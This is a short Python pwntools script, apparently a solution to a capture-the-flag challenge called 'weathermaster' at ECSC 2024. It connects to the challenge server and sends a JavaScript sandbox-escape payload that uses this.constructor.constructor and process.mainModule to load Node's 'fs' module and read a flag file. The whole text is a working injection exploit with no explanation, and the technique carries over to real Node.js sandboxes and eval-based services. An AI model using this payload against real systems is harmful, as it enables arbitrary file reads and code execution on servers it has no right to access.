from pwn import *

p = remote('weathermaster.ecsc24.hack.cert.pl', 5105)

p.recvuntil(b'>> ')

payload = "this.constructor.constructor(`return process.mainModule.constructor._load('fs').readFileSync(Buffer.from('/app/../flag.txt')).toString()`)()"

p.sendline(f'! {payload}'.encode())

print(p.recvuntil(b'>> ').decode())